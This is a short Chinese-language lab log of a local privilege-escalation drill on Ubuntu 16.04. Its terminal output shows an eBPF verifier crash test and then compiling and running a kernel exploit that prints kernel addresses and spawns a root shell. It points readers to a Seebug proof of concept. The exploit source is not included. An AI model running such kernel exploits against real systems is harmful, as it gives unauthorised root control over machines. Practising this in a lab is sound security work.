在Ubuntu16.04 Desktop版本下进行漏洞演练提权
xw@xw:~/桌面$ id
uid=1000(xw) gid=1000(xw) 组=1000(xw),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
xw@xw:~/桌面$ gcc -o crasher_badtrunc crasher_badtrunc.c -Wall && ./crasher_badtrunc
prog load: Permission denied
0: (18) r1 = 0x0
2: (bf) r8 = r10
3: (07) r8 += -4
4: (b4) (u32) r2 = (u32) 1
5: (63) *(u32 *)(r8 +0) = r2
6: (bf) r2 = r8
7: (85) call 1
8: (55) if r0 != 0x0 goto pc+2
 R0=imm0 R8=fp-4 R10=fp
9: (bf) r0 = r0
10: (95) exit

from 8 to 11: R0=map_value(ks=4,vs=8) R8=fp-4 R10=fp
11: (b4) (u32) r3 = (u32) 8
12: (63) *(u32 *)(r0 +0) = r3
13: (61) r3 = *(u32 *)(r0 +0)
14: (57) r3 &= 15
15: (b4) (u32) r1 = (u32) 2147483644
16: (0f) r1 += r1
17: (0f) r1 += r3
18: (b4) (u32) r2 = (u32) 0
19: (0c) (u32) r1 += (u32) r2
20: (77) r1 >>= 31
21: (17) r1 -= 1
22: (27) r1 *= -1
23: (67) r1 <<= 60
24: (0f) r0 += r1
R0 pointer arithmetic prohibited
xw@xw:~/桌面$ 
xw@xw:~/桌面$ gcc -o exp upstream44.c 
xw@xw:~/桌面$ ./exp 
task_struct = ffff880034bb6200
uidptr = ffff88001307e484
spawning root shell
root@xw:~/桌面# id
uid=0(root) gid=0(root) 组=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(xw)
root@xw:~/桌面# 

参考seebug关于此漏洞的poc和crash过程即可完成
